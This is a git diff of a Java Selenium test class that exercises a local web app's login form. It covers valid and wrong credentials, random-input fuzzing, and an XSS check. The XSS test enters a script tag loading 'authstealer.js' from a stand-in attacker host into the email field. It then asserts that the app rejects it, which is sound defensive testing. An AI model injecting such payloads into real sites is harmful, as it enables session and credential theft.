@@ -2,10 +2,12 @@ import org.junit.After;
 import org.junit.Before;
 import org.junit.Test;
 import org.openqa.selenium.By;
+import org.openqa.selenium.TimeoutException;
 import org.openqa.selenium.WebDriver;
 import org.openqa.selenium.WebElement;
 import org.openqa.selenium.edge.EdgeDriver;
 import org.openqa.selenium.firefox.FirefoxDriver;
+import org.openqa.selenium.support.ui.ExpectedConditions;
 import org.openqa.selenium.support.ui.WebDriverWait;
 
 import java.util.Random;
@@ -14,6 +16,10 @@ public class TestLogin {
 
     public static WebDriver driver;
     public static WebDriverWait wait;
+    public static WebElement loginButton;
+    public static WebElement email;
+    public static WebElement password;
+    public static WebElement loginAsButton;
 
     protected String getSaltString() {
         String SALTCHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
@@ -29,24 +35,28 @@ public class TestLogin {
     }
 
     @Before
-    public void setup() throws InterruptedException{
+    public void setup() throws InterruptedException {
         // Optional. If not specified, WebDriver searches the PATH for chromedriver.
-    	System.setProperty("webdriver.gecko.driver","C:\\Users\\Windows\\eclipse-workspace\\ESCSelenium\\drivers\\geckodriver\\geckodriver.exe");
-		driver = new FirefoxDriver();
+        System.setProperty("webdriver.edge.driver", "C:\\msedgedriver.exe");
+        driver = new EdgeDriver();
         driver.get("http://localhost:3000");
 
+        wait = new WebDriverWait(driver, 5);
+
+
         Thread.sleep(2500);
+        email = driver.findElement(By.name("email"));
+        password = driver.findElement(By.name("password"));
+        loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/div/form/div/div[1]/div/label[1]/span[2]")));
+        loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/div/form/div/div[5]/div/div/div/button/span")));
     }
 
     @Test
-    public void testLoginAsAuditor() throws InterruptedException{
+    public void testLoginAsAuditor() throws InterruptedException {
 
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
         email.sendKeys("sgh@auditor.com");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
         password.sendKeys("sgh2021");
 
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
         Thread.sleep(1000);
 
         loginButton.click();
@@ -55,19 +65,25 @@ public class TestLogin {
     }
 
     @Test
-    public void testLoginAsAuditorWrongPassword() throws InterruptedException{
+    public void testLoginAsAuditorWrongPassword() throws InterruptedException {
 
-        WebElement email = driver.findElement(By.name("email"));
         email.sendKeys("cgh@auditor.com");
-        WebElement password = driver.findElement(By.name("password"));
         password.sendKeys("wrongpassword");
-
-        WebElement loginButton = driver.findElement((By.xpath("/html/body/div/form/div[2]/div[4]/div/div/div/button/span")));
-        Thread.sleep(1000);
 
         loginButton.click();
 
+        try {
+
+            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
+                    "Auditor does not exist"));
+            assert (exist);
+        } catch (TimeoutException e) {
+            assert (false);
+        }
+
+
         Thread.sleep(4000);
+
 
 //        WebElement errorMessage = driver.findElement(By.xpath("///*[@id=\"root\"]/form/div[2]/div[4]/ul/div/div/div[1]"));
         ////*[@id="root"]/form/div[2]/div[4]/ul/div/div/div[1]
@@ -80,31 +96,20 @@ public class TestLogin {
     }
 
     @Test
-    public void testLoginAsAuditorWrongEmail() throws InterruptedException{
+    public void testLoginAsAuditorWrongEmail() throws InterruptedException {
 
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
         email.sendKeys("cgh@audi123tor.com");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
         password.sendKeys("cgh2021");
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
-        Thread.sleep(1000);
-
         loginButton.click();
+
 
         Thread.sleep(4000);
     }
 
     @Test
-    public void testLoginAsAuditorNeverFillPassword() throws InterruptedException{
+    public void testLoginAsAuditorNeverFillPassword() throws InterruptedException {
 
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
         email.sendKeys("cgh@audi123tor.com");
-//        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
-//        password.sendKeys("cgh2021");
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
-        Thread.sleep(1000);
 
         loginButton.click();
 
@@ -112,63 +117,54 @@ public class TestLogin {
     }
 
     @Test
-    public void testLoginAsTenant() throws InterruptedException{
-        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
+    public void testLoginAsTenant() throws InterruptedException {
         loginAsButton.click();
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
         email.sendKeys("cghNoelGifts@tenant.com");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
         password.sendKeys("noelgifts2021");
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
         loginButton.click();
+
         Thread.sleep(2000);
     }
 
     @Test
-    public void testLoginFuzzerEmail() throws InterruptedException{
-        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
+    public void testLoginFuzzerEmail() throws InterruptedException {
         loginAsButton.click();
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
-        email.sendKeys(getSaltString()+"@tenant.com");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
+        email.sendKeys(getSaltString() + "@tenant.com");
         password.sendKeys("noelgifts2021");
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
         loginButton.click();
+
         Thread.sleep(2000);
     }
 
     @Test
-    public void testLoginFuzzerEmailAndPassword() throws InterruptedException{
-        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
+    public void testLoginFuzzerEmailAndPassword() throws InterruptedException {
         loginAsButton.click();
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
-        email.sendKeys(getSaltString()+"@tenant.com");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
+        email.sendKeys(getSaltString() + "@tenant.com");
         password.sendKeys(getSaltString());
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
         loginButton.click();
+
         Thread.sleep(2000);
     }
 
     @Test
-    public void testLoginXSS() throws InterruptedException{
-        WebElement loginAsButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[1]/div/label[1]/span[2]")));
+    public void testLoginXSS() throws InterruptedException {
         loginAsButton.click();
-        WebElement email = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[1]/div[2]/div/div/input"));
         email.sendKeys("<script src=”http://hackersite.com/authstealer.js”> </script>");
-        WebElement password = driver.findElement(By.xpath("//*[@id=\"root\"]/form/div[2]/div[2]/div[2]/div/div/input"));
         password.sendKeys(getSaltString());
-
-        WebElement loginButton = driver.findElement((By.xpath("//*[@id=\"root\"]/form/div[2]/div[4]/div/div/div/button/span")));
         loginButton.click();
-        Thread.sleep(2000);
+
+        try {
+            Boolean exist = wait.until(ExpectedConditions.textToBePresentInElement(driver.findElement(By.xpath("//div[@id= \"root\"]")),
+                    "Tenant not found"));
+            assert (exist);
+        } catch (TimeoutException e) {
+            assert (false);
+        }
+
     }
 
     @After
-    public void quit() throws InterruptedException{
+    public void quit() throws InterruptedException {
         driver.quit();
     }
 }
